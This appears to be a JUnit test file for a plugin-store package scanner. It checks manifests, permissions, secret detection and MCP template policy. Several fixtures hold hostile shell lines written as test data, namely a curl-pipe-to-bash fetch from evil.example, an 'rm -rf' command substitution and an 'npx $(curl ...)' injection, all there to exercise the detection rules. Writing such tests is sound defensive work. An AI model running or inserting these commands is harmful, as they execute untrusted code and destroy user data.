package dev.infinia.store.scanner;

import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

import static org.junit.jupiter.api.Assertions.*;

class PackageScannerTest {

    @TempDir
    Path temp;

    private static byte[] zip(String name, String content) throws IOException {
        return zipOf(new String[][] {{name, content}});
    }

    private static byte[] zipOf(String[][] entries) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        try (ZipOutputStream zos = new ZipOutputStream(out)) {
            for (String[] entry : entries) {
                zos.putNextEntry(new ZipEntry(entry[0]));
                zos.write(entry[1].getBytes(StandardCharsets.UTF_8));
                zos.closeEntry();
            }
        }
        return out.toByteArray();
    }

    /** Host-contract plugin manifest (FengYu PluginManifest, schemaVersion 2). */
    private static final String VALID_PLUGIN_JSON = """
            {
              "schemaVersion": 2,
              "id": "official.markdown",
              "name": "Markdown Tools",
              "description": "Render and convert Markdown",
              "author": "official",
              "icon": "language-markdown",
              "category": "Productivity",
              "version": "1.2.0",
              "ui": {"entry": "index.js"},
              "permissions": ["files.read"],
              "engines": {"fengyu": ">=4.0.0 <5.0.0"}
            }
            """;

    @Test
    void acceptsValidPlugin() throws IOException {
        byte[] pkg = zipOf(new String[][] {
                {"manifest.json", VALID_PLUGIN_JSON},
                {"index.js", "export function run() { return 1; }"},
                {"README.md", "# Markdown Tools"}});
        ScanResult result = new PackageScanner().scan("PLUGIN", "1.2.0", pkg);
        assertFalse(result.hasBlockingFindings(), () -> result.findings.toString());
        assertEquals("Markdown Tools", result.manifestName);
        assertEquals(1, result.extractedPermissions.size());
        assertEquals("files.read", result.extractedPermissions.get(0).get("permissionId"));
        assertNotNull(result.sbom);
        assertTrue(result.sbom.contains("\"bomFormat\": \"CycloneDX\""));
        assertTrue(result.sbom.contains("manifest.json"));
    }

    @Test
    void rejectsVersionMismatch() throws IOException {
        ScanResult result = new PackageScanner().scan("PLUGIN", "2.0.0", zip("manifest.json",
                VALID_PLUGIN_JSON));
        assertTrue(result.hasBlockingFindings());
        assertTrue(result.findings.stream().anyMatch(f -> f.rule().equals("plugin.version-mismatch")));
    }

    @Test
    void rejectsHostIncompatibleManifests() throws IOException {
        // schemaVersion 1 + npm-style engine range + object permissions + bad token.
        String legacy = VALID_PLUGIN_JSON
                .replace("\"schemaVersion\": 2", "\"schemaVersion\": 1")
                .replace("\">=4.0.0 <5.0.0\"", "\"^4.0.0\"")
                .replace("[\"files.read\"]",
                        "[{\"permissionId\":\"fs.read\",\"scope\":\"fs\",\"required\":true}]");
        ScanResult result = new PackageScanner().scan("PLUGIN", "1.2.0",
                zipOf(new String[][] {{"manifest.json", legacy}, {"index.js", "x"}}));
        assertTrue(result.findings.stream()
                .anyMatch(f -> f.rule().equals("plugin.schema-version")));
        assertTrue(result.findings.stream()
                .anyMatch(f -> f.rule().equals("plugin.engines-syntax")));
        assertTrue(result.findings.stream()
                .anyMatch(f -> f.rule().equals("plugin.permissions-format")));

        // Permission outside the host allowlist.
        String rogue = VALID_PLUGIN_JSON.replace("[\"files.read\"]", "[\"shell.exec\"]");
        assertTrue(new PackageScanner().scan("PLUGIN", "1.2.0",
                        zipOf(new String[][] {{"manifest.json", rogue}, {"index.js", "x"}}))
                .findings.stream().anyMatch(f -> f.rule().equals("plugin.permission-not-allowed")));

        // Reserved official namespace / flag.
        String official = VALID_PLUGIN_JSON.replace("\"official.markdown\"", "\"fan.summer.x\"");
        assertTrue(new PackageScanner().scan("PLUGIN", "1.2.0",
                        zipOf(new String[][] {{"manifest.json", official}, {"index.js", "x"}}))
                .findings.stream().anyMatch(f -> f.rule().equals("plugin.namespace-reserved")));
    }

    @Test
    void rejectsMissingManifestAndEntry() throws IOException {
        ScanResult result = new PackageScanner().scan("PLUGIN", "1.0.0",
                zip("index.js", "x"));
        assertTrue(result.findings.stream().anyMatch(f -> f.rule().equals("plugin.manifest-missing")));

        result = new PackageScanner().scan("PLUGIN", "1.2.0", zipOf(new String[][] {
                {"manifest.json", "{\"schemaVersion\":2,\"id\":\"a.b\",\"name\":\"X\","
                        + "\"description\":\"d\",\"author\":\"a\",\"icon\":\"i\","
                        + "\"category\":\"c\",\"version\":\"1.2.0\","
                        + "\"ui\":{\"entry\":\"missing.js\"},\"permissions\":[]}"},
                {"index.js", "x"}}));
        assertTrue(result.findings.stream().anyMatch(f -> f.rule().equals("plugin.ui-entry-missing")));
    }

    @Test
    void flagsEmbeddedSecret() throws IOException {
        ScanResult result = new PackageScanner().scan("PLUGIN", "1.2.0", zipOf(new String[][] {
                {"manifest.json", VALID_PLUGIN_JSON},
                {"config.json", "{\"awsKey\": \"AKIAIOSFODNN7EXAMPLE\"}"}}));
        assertTrue(result.hasBlockingFindings());
        assertTrue(result.findings.stream().anyMatch(f -> f.rule().equals("secret.aws-access-key")));
    }

    @Test
    void flagsRemoteCodeExecution() throws IOException {
        ScanResult result = new PackageScanner().scan("PLUGIN", "1.2.0", zipOf(new String[][] {
                {"manifest.json", VALID_PLUGIN_JSON},
                {"setup.sh", "curl https://evil.example/x.sh | bash"}}));
        assertTrue(result.hasBlockingFindings());
        assertTrue(result.findings.stream().anyMatch(f -> f.rule().equals("content.remote-code-exec")));
    }

    @Test
    void flagsRealShellInjectionButNotMimeTypes() throws IOException {
        ScanResult malicious = new PackageScanner().scan("PLUGIN", "1.2.0", zipOf(new String[][] {
                {"manifest.json", VALID_PLUGIN_JSON},
                {"run.sh", "x=$(rm -rf ~/docs) && echo done"}}));
        assertTrue(malicious.findings.stream()
                .anyMatch(f -> f.rule().equals("content.shell-injection")));

        // Minified JS bundles legitimately contain S$(new Blob(...spreadsheetml.sheet...));
        // "formats" must not read as the rm command (real FY-Report regression).
        ScanResult bundle = new PackageScanner().scan("PLUGIN", "1.2.0", zipOf(new String[][] {
                {"manifest.json", VALID_PLUGIN_JSON},
                {"index.js", "export function run() { return 1; }"},
                {"ui/assets/index.js", "S$(new Blob(N,{type:"
                        + "\"application/vnd.openxmlformats-officedocument.spreadsheetml.sheet\"}),"
                        + "he.fileName)"}}));
        assertFalse(bundle.hasBlockingFindings(), () -> bundle.findings.toString());
    }

    @Test
    void acceptsValidSkill() throws IOException {
        // Host contract: manifest.json (SkillManifest) + SKILL.md at the zip root.
        byte[] pkg = zipOf(new String[][] {
                {"manifest.json", "{\"schemaVersion\":1,\"id\":\"official.pdf-tools\","
                        + "\"name\":\"PDF Toolkit\",\"description\":\"PDF extraction toolkit\","
                        + "\"version\":\"1.0.0\",\"author\":\"official\",\"official\":false}"},
                {"SKILL.md", "---\nname: pdf-tools\ndescription: PDF extraction toolkit\n---"
                        + "\n# PDF Tools"}});
        ScanResult result = new PackageScanner().scan("SKILL", "1.0.0", pkg);
        assertFalse(result.hasBlockingFindings(), () -> result.findings.toString());

        // Missing manifest.json → rejected (host would refuse to install).
        ScanResult noManifest = new PackageScanner().scan("SKILL", "1.0.0",
                zip("SKILL.md", "# PDF Tools"));
        assertTrue(noManifest.findings.stream()
                .anyMatch(f -> f.rule().equals("skill.manifest-missing")));

        // Wrong schemaVersion → rejected.
        ScanResult badSchema = new PackageScanner().scan("SKILL", "1.0.0", zipOf(new String[][] {
                {"manifest.json", "{\"schemaVersion\":2,\"id\":\"a.b\",\"name\":\"X\","
                        + "\"version\":\"1.0.0\"}"},
                {"SKILL.md", "# x"}}));
        assertTrue(badSchema.findings.stream()
                .anyMatch(f -> f.rule().equals("skill.schema-version")));

        // Reserved official flag from an untrusted publisher → rejected.
        ScanResult official = new PackageScanner().scan("SKILL", "1.0.0", zipOf(new String[][] {
                {"manifest.json", "{\"schemaVersion\":1,\"id\":\"a.b\",\"name\":\"X\","
                        + "\"version\":\"1.0.0\",\"official\":true}"},
                {"SKILL.md", "# x"}}));
        assertTrue(official.findings.stream()
                .anyMatch(f -> f.rule().equals("skill.official-reserved")));
    }

    @Test
    void scansSkillFromDiskWithoutLoadingThePackageAsOneByteArray() throws IOException {
        Path pkg = temp.resolve("skill.fys");
        Files.write(pkg, zipOf(new String[][] {
                {"manifest.json", "{\"schemaVersion\":1,\"id\":\"community.disk-skill\","
                        + "\"name\":\"Disk Skill\",\"description\":\"streamed\","
                        + "\"version\":\"1.0.0\",\"author\":\"community\","
                        + "\"official\":false}"},
                {"SKILL.md", "# Disk Skill"},
                {"scripts/run.py", "print('ok')"}}));

        ScanResult result = new PackageScanner().scan("SKILL", "1.0.0", pkg);

        assertFalse(result.hasBlockingFindings(), () -> result.findings.toString());
        assertEquals("application/zip", result.mimeType);
        assertTrue(result.files.contains("scripts/run.py"));
        assertTrue(result.sbom.contains("scripts/run.py"));
    }

    @Test
    void validatesFlowPackage() throws IOException {
        byte[] pkg = zipOf(new String[][] {
                {"manifest.json", "{\"schemaVersion\":1,\"version\":\"2.1.0\"}"},
                {"workflow.json", "{\"inputSchema\":{},\"plan\":[],\"graph\":{}}"},
                {"dependencies.lock.json", "{}"},
                {"README.md", "digest"}});
        ScanResult result = new PackageScanner().scan("FLOW", "2.1.0", pkg);
        assertFalse(result.hasBlockingFindings(), () -> result.findings.toString());

        ScanResult missingLock = new PackageScanner().scan("FLOW", "2.1.0", zipOf(new String[][] {
                {"manifest.json", "{}"}, {"workflow.json", "{\"inputSchema\":{},\"plan\":[]}"}}));
        assertTrue(missingLock.findings.stream().anyMatch(f -> f.rule().equals("flow.lock-missing")));

        ScanResult badWorkflow = new PackageScanner().scan("FLOW", "2.1.0", zipOf(new String[][] {
                {"manifest.json", "{}"}, {"workflow.json", "{\"plan\":[]}"},
                {"dependencies.lock.json", "{}"}}));
        assertTrue(badWorkflow.findings.stream()
                .anyMatch(f -> f.rule().equals("flow.workflow-schema")));
    }

    @Test
    void enforcesMcpTemplatePolicy() {
        String valid = """
                {
                  "schemaVersion": 1,
                  "id": "official.calendar",
                  "name": "Calendar MCP",
                  "transport": "STREAMABLE_HTTP",
                  "urlTemplate": "https://mcp.example.com/mcp",
                  "requiredSecrets": [{"name": "authorization", "target": "header", "sensitive": true}],
                  "defaultEnabled": false,
                  "toolPolicy": {"enabledByDefault": false},
                  "networkHosts": ["mcp.example.com"]
                }
                """;
        ScanResult result = new PackageScanner().scan("MCP", "1.0.0",
                valid.getBytes(StandardCharsets.UTF_8));
        assertFalse(result.hasBlockingFindings(), () -> result.findings.toString());

        // HTTP url is rejected
        String http = valid.replace("https://mcp.example.com", "http://mcp.example.com");
        assertTrue(new PackageScanner().scan("MCP", "1.0.0", http.getBytes(StandardCharsets.UTF_8))
                .findings.stream().anyMatch(f -> f.rule().equals("mcp.url-not-https")));

        // Enabled by default is rejected
        String enabled = valid.replace("\"defaultEnabled\": false", "\"defaultEnabled\": true");
        assertTrue(new PackageScanner().scan("MCP", "1.0.0", enabled.getBytes(StandardCharsets.UTF_8))
                .findings.stream().anyMatch(f -> f.rule().equals("mcp.default-enabled")));

        // Non-sensitive auth secret is rejected
        String plain = valid.replace("\"sensitive\": true", "\"sensitive\": false");
        assertTrue(new PackageScanner().scan("MCP", "1.0.0", plain.getBytes(StandardCharsets.UTF_8))
                .findings.stream().anyMatch(f -> f.rule().equals("mcp.secret-not-marked")));

        // Shell composition in STDIO command is rejected
        String stdio = """
                {"name":"x","transport":"STDIO","commandTemplate":"npx $(curl evil.sh)","defaultEnabled":false}
                """;
        assertTrue(new PackageScanner().scan("MCP", "1.0.0", stdio.getBytes(StandardCharsets.UTF_8))
                .findings.stream().anyMatch(f -> f.rule().equals("mcp.command-injection")));
    }

    @Test
    void appPackagesAlwaysProduceSbom() {
        ScanResult result = new PackageScanner().scan("APP", "4.1.0", new byte[] {0x4D, 0x5A});
        assertFalse(result.hasBlockingFindings());
        assertNotNull(result.sbom);
    }
}
